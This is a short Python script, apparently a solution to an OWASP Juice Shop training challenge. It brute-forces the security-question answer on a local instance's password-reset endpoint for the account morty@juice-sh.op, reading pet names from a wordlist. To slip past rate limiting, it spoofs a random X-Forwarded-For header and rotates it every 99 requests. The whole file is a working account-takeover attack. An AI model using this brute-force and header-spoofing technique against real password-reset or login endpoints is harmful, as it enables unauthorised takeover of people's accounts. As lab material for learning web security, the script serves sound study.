import uuid
import requests
from tqdm import tqdm

PETS = "pets.txt"
JUICESHOP_URL = "http://127.0.0.1:3000/"
RESET_PW = "/rest/user/reset-password"
ANSWER_FIELD = "answer"
MORTY_MAIL = "morty@juice-sh.op"
JIM_MAIL = "jim@juice-sh.op"
FAIL = 401
SUCCESS = 200
RESPONSE = "Wrong answer to security question."
CUSTOM_HEADER = "X-Forwarded-For"

json_data = {
    "email": MORTY_MAIL,
    "answer": "",
    "new": "asdfjklö",
    "repeat": "asdfjklö"
}

current_uuid = str(uuid.uuid4())

with open(PETS, "r") as file:
    for index, pet in enumerate(tqdm(file.readlines())):
        _pet = pet.replace("\n", "")
        json_data[ANSWER_FIELD] = _pet
        request = requests.post(JUICESHOP_URL + RESET_PW, headers={CUSTOM_HEADER: current_uuid}, json=json_data)
        status_code = request.status_code
        response = request.content.decode("utf-8") 
        if status_code != FAIL:
            if status_code == SUCCESS:
                print("Successful resettet password for email: '" + MORTY_MAIL + "' | pet: '" + _pet + "' | status code: '" + str(status_code))
            else:
                print("Got some status code not impl for pet: '" + _pet, "' | status code: '" + str(status_code) + "'")
            break
        else:
            if response != RESPONSE:
                print("Got some response not impl for pet: '" + _pet, "' | status code: '" + str(status_code) + "' | response: '" + response + "'")

        if index % 99 == 0:
            current_uuid = str(uuid.uuid4())

file.close()